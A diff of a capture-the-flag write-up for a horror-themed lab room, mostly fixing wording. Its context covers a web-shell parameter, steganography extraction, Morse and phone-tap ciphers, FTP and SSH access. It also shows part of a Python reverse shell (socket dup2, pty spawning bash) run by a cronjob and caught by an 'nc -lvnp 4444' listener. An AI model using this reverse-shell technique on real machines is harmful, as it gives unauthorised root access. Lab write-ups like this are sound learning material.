@@ -46,16 +46,15 @@ The page source of this room gives a hint about a *shell*, so I tried to add it 
 ?shell=<command>
 ```
 
-It is a very limited shell because as most commands result in *Command not permitted!*, but the **ls** command worked, so I had a look around the filesystem. The parent directory (..) contained two interesting directories, one of which was the current directory name, so I replaced that with the other one.
+It is a very limited shell as most commands result in *Command not permitted!*, but the **ls** command worked, so I had a look around the filesystem. The parent directory (..) contained two interesting directories, one of which was the current directory name, so I replaced that in the url with the other one.
 
-This let me escape from Laura! This new directory contained a txt file congratulating me, as well as a *helpme.zip*. Unzipping revealed the helpme.txt and Table.jpg files. 
+This let me escape from Laura! This new directory contained a .txt file congratulating me, as well as a *helpme.zip*. Unzipping revealed the helpme.txt and Table.jpg files. 
 
 helpme.txt:
 ```
 From Joseph,
 
-Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of 
-this cell.
+Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of this cell.
 ```
 
 Using Binwalk found there were some embedded files within the Table.jpg file, as it returned *key.wav* and *Joseph_Oda.jpg*. Running unzip again retrieved these 2 files.
@@ -63,18 +62,18 @@ Using Binwalk found there were some embedded files within the Table.jpg file, as
 
 ## Audacity & FTP
 
-Loading key.wav into audacity shows a sequence of shorter and longer beeps separated by even longer gaps: *morse code!* Translating it reveals the passphrase **showme**. Using this key with upper case let's us extract a final text file from Joseph_Oda.jpg.
+Loading key.wav into Audacity shows a sequence of shorter and longer beeps separated by even longer gaps: *morse code!* Translating it reveals the passphrase **showme**. Using this key in the upper case let's us extract a final text file from Joseph_Oda.jpg.
 
 ```
 steghide extract -sf Joseph_Oda.jpg
 ```
 
-This generated a thankyou.txt file with some ftp credentials for the *joseph* user.
+This generated thankyou.txt with some ftp credentials for the *joseph* user.
 ```
 ftp <ip>
 ```
 
-On the ftp server, there were two files, a program and a dictionary list called random.dic.
+On the ftp server, there were two files, a program and a dictionary list called random.dic, so I downloaded those.
 
 
 ## Python script to find the keyword
@@ -109,7 +108,7 @@ Well Done !!!
 Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
 ```
 
-Because there is a maximum of 4 numbers supplied, I guessed this was a *tap phone cipher*, and I was right. The message is the password to ssh for the *kidman* user.
+Because there is a maximum of 4 numbers supplied, I guessed this was a *tap phone cipher*, and I was right. The decoded message is the password to ssh for the *kidman* user.
 
 
 ## SSH & Privilege Escalation
@@ -130,10 +129,9 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 import pty 
 pty.spawn("/bin/bash")
-
 ```
 
 Then, setup the listener with **nc -lvnp 4444** and wait for the cronjob to run!
 The root flag was found in the /root directory as usual :)
 
-This challenge was so fun! Not particularly difficult, but had a lot of enjoyable elements like the morse code in the .wav file.
+This challenge was so fun! Not particularly difficult, but had a lot of enjoyable elements like the morse code in the .wav file and the custom brute force script.
